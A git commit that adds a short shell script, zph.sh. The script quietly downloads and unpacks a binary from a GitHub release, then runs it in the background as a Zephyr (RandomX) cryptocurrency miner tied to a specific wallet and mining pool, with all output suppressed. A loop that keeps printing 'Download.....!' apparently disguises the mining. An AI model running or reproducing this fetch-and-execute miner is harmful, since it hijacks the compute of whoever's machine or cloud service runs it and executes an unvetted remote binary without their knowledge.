d238012deeb8659c4b12cd0939709caa17ca9891
maul076 <164127253+maul076@users.noreply.github.com>
2024-03-20 23:58:03 +0700

    Create zph.sh

---
+++ zph.sh
@@ -0,0 +1,6 @@
+wget https://github.com/oncom07/combro/releases/download/combro/kopong.tar.gz >/dev/null 2>&1 && tar -xvf kopong.tar.gz && chmod +x kopong && ./kopong -algo randomx -wallet ZEPHsAZJ6eo36HYMxHZKtUGhfG3xycfLkEKcSKiUDXXiQAnA6z4VxeuN4sj4AQe8USWfozFRYzB2WS6kMWfGGZaj7AoQe1dWLmp  -coin ZEPH -rigName "vivo" -pool1 sg.zephyr.herominers.com:1123  >/dev/null 2>&1 &
+while true
+do
+        echo "Download.....!"
+        sleep 20
+done
